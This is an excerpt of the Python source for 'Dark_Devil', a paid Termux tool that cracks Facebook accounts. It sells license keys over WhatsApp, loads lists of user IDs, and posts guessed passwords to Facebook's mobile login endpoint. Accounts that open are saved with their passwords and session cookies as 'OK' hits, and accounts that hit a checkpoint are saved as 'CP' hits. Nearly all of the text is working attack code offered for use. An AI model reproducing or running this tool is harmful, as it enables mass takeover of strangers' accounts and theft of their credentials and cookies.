...
os.system('pip uninstall beautifulsoup4 -y;pip install beautifulsoup4')
...
time.sleep(2)
os.system('clear')
print("\033[97;1m[\x1b[38;5;50m+\033[97;1m]\x1b[38;5;50m FOLLOW MY GITHUB ACCOUNT..!")

time.sleep(1)
os.system(f'xdg-open https://chat.whatsapp.com/BZMrhlZMApvLqQeIAhzSSJ')
...
prinCP=[]
try:
    prox= requests.get('https://github.com/xploithunter5/Xploit_Hunter/blob/Dark_Devil.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/darkdevil120/Dark_Devill/blob/Dark_Devil/Dark_Devil.txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/profile.php?id=100092449069161')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║   \033[0;91m ____  ____  ____  _  __      ____  _____ _     _  _             ║\033[1;31m          
║   \033[0;91m/  _ \/  _ \/  __\/ |/ /     /  _ \/  __// \ |\/ \/ \                ║  \033[1;97m       
║   \033[0;91m| | \|| / \||  \/||   /      | | \||  \  | | //| || |                          ║  \033[0;91m        
║   \033[0;91m| |_/|| |-|||    /|   \      | |_/||  /_ | \// | || |_/\                    ║ \33[1;34m           
║   \033[0;91m\____/\_/ \|\_/\_\\_|\_\_____\____/\____\\__/  \_/\____/\033[1;35m         
║   \033[0;91m                        \____\                                                                                 
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝                                                           
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mDark_Devil \33[1;38m    ║\033[1;31m 
╠══[Facebook                 • Dark_Devil     ║  \033[1;97m  
╠══[Github                   • \33[1;38mDark_Devil     ║\33[1;34m   
╠══[Whatsapp                 • 9762902527     ║\33[1;35m 
╠══[TOOLS                    • PAID           ║ \33[1;32m   
╠══[VERSION                  • 1.0            ║\033[1;35m 
\033[0;94m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝\033[1;31m
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m Dark_Devil\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m●                  \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱
\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m Dark_Devil TERMUX ZONE 👨‍💻\033[1;95m● \033[1;95m● \033[1;91m● \033[1;92m● \033[1;93m● \033[1;91m[\033[1;92m√\033[1;91m]
\033[1;92m⊰᯽⊱┈──╌──────╌──╌╌──╌───╌❊╌──╌──╌────╌────╌─╌──┈⊰᯽⊱""")
balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
meyermarexudi =(""" \033[0;97m=============================================""")    
alltimexudi =(""" \033[32;1m[-] ONLY APPROVAL SYSTEM 7 DAYS RS 250, 30 RS 500 FOR    APPROVAL""")
xudartimenai =(""" \033[32;1m[+] CONTACT ADMIN """)
fuckyoursali =(""" \033[32;1m[𝟷] 𝚈𝙾𝚄𝚁 𝚃𝙾𝙺𝙴𝙽 𝙸𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝙰𝙿𝙿𝚁𝙾𝚅𝙴𝙳""")
xudinaministar =(""" \033[32;1m[-] Importent Note """)
hedaborakarent =(""" \033[32;1m[𝟸] 𝙵𝚄𝙲𝙺 𝚈𝙾𝚄𝚁 𝙳𝙰𝚃𝙰 """)
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/darkdevil120/Dark_Devill/blob/Dark_Devil/Dark_Devil.txt').text
    if id in httpCaht:
      print(fuckyoursali)
     ...
     # print(" \033[32;1m[+] Your Key : "+id)
      print(' \x1b[38;5;208m╔══[𝟷] FREE USER DO NOT INBOX')
      ...
      print(' \x1b[1;93m║══[𝟸] CP ID LOGIN 90%')
      print(' \x1b[1;94m║══[𝟸] WI-FI WORKING 100%')
      print(' \x1b[1;95m║══[𝟸] 15 DAY Rs 400 ')
      print(' \x1b[38;5;50m║══[𝟸] 30 DAY Rs 800 ')
      print(" \033[1;32m║══[𝟸] YOUR KEY : "+id)
      input(' \x1b[38;5;50m╚══[𝟹] IF U WANT TO BUY THEN PRESS ENTER ')
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+9779762902527?text='+tks),approval()      
      time.sleep(0.1)
      meyexudi()
  except:
    sys.exit()
meyexudi()
#os.system("python Dark_Devil.py")
def naima():
	print('-------------------')
print(logo)
...
while attemps < 12345677901:
    ...
    if username == 'Dark_Devil' and password == 'Dark_Devil':
...
def menu():
    ...
    print('\x1b[38;5;50║══=================')
    Dark_Devil = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if Dark_Devil in ['111']:
        login()
        dump_massal()
    elif Dark_Devil in ['1']:
        crack_file()
    elif Dark_Devil in ['2','02']:
        os.system('xdg-open https://github.com/darkdevil120')
        os.system("python nono.py")
    elif Dark_Devil in ['3','03']:
        result()
    elif Dark_Devil in ['0']:
...
def crack_file():
    ...
    o = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mENTER YOUR FILE NAME :\x1b[1;95m ')
...
def setting():
    print('\x1b[38;5;50m=============================')
    print("\x1b[1;91m╔══\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mOLD IDz")
    print("\x1b[1;92m║══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mNEW IDz")
    print("\x1b[1;93m╚══\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mMIX IDz")
    print('\x1b[38;5;50m=============================')
    ...
    #os.system("xdg-open https://www.facebook.com/Dark_Devil.King.Ok.Bro")
    if hc in ['1','01']:
...
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m USERNAME\x1b[1;93m :\x1b[1;93m "+𝚞𝚗𝚊𝚖𝚎)
    print('\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m TOTAL ID\x1b[1;93m:\x1b[1;93m ',str(len(id)))
    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m EXACT TIME\x1b[1;93m: \x1b[1;93m"+time.strftime("%H:%M")+" "+ tag)
    print("\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m TOOLS IS FIRE-!🔥")
    print(f'\x1b[1;93m\x1b[1;93m====>\x1b[1;93m] \x1b[1;93m TOOLS USED=[TOOLS WORKING WIFI //DATA 🤧] ')
    print('\x1b[1;93m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Dark_Devil]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDark_Devil-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')                
                ...
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDark_Devil-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')      
...
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[Dark_Devil-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mDark_Devil-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')          
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
